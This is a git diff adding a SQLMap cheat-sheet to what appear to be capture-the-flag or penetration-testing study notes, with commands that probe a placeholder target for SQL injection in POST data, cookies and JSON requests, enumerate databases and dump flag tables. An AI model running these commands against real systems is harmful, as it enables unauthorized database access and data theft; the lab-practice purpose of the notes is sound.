@@ -219,4 +219,19 @@ if (isset($_GET['c'])) {
 - Explore the site and dont use the first search you see.
 - Check source code and go step by step I just listed
 
+## SQLMap
+```bash
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+python sqlmap.py
+```
+| Command | Description |
+|--------|------------|
+| `sqlmap -u "http://target:port/test.php" --data="id=1"` | Identify Injectable POST (id) | 
+| `sqlmap -u "http://target:port/test.php" --data="id=1" --dbs` | Look for available DB. (Info_schema is normal) |
+| `sqlmap -u "http://target:port/test.php" --data="id=1" -D testdb --tables` | Found DB (testdb) and use --tables to look for whats inside it |
+| `sqlmap -u "http://target:port/test.php" --data="id=1" -D testdb -T flag2 --dump' | Saw Flag2 as a table and --dump contents |
+| `sqlmap -u "http://target:port/test.php" --cookie="id=1" -p id --level=5 --risk=3` | Force SQLi Testing on Injectable Cookie Value (id) |
+| `sqlmap -u "http://target:port/test.php" --cookie="id=1" -D testdb -T flag3 --dump` | Repeat same process as ABOVE example ^ |
+| `POST /case4.php {"id":1}` | With JSON, use BurpSuite -> Proxy -> Send to Repeater -> Copy to file -> Cat the file in bash |
+| `sqlmap -r req.txt -pd id --dbs --batch` | Same process, find DB -> find tables inside DB -> dump flag |
 
